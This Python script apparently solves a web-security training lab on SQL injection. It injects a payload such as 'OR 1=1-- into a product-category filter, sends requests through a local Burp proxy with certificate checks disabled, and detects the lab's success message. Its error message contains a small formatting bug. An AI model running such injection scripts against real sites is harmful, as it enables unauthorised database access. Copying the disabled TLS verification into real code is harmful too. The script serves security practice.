#!/usr/bin/env python3
import sys
import warnings
from typing import Optional
from urllib.parse import urljoin

import requests
from requests.exceptions import RequestException

# To suppress insecure requests warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")
# import urllib3
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FILTER_ENDPOINT = "filter"
REQUEST_TIMEOUT = (2, 5)
BURP_PROXY = {"http": "127.0.0.1:8080", "https": "127.0.0.1:8080"}


def exploit_sqli(url: str, payload: str, proxies: Optional[dict] = None) -> bool:
    """Makes a GET request with the payload for category, determines if the injection was successful"""
    catgeory_value = "Gifts" + payload
    try:
        res = requests.get(
            urljoin(url, FILTER_ENDPOINT),
            params={"category": catgeory_value},
            timeout=REQUEST_TIMEOUT,
            proxies=proxies,
            verify=False,
        )
        res.raise_for_status()

    except RequestException:
        print("[-] Request failed {e}")
        return False

    return res is not None and "Congratulation" in res.text


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <payload>")
        print(
            f'Example: {sys.argv[0]} https://lab-id.web-security-academy.net "\'OR 1=1--"'
        )
        sys.exit(1)

    url = sys.argv[1].rstrip("/")
    payload = sys.argv[2].strip()

    if exploit_sqli(url, payload, BURP_PROXY):
        print("[!] SUCCESS: Lab solved. ")
    else:
        print("[-] SQL injection failed!")


if __name__ == "__main__":
    main()
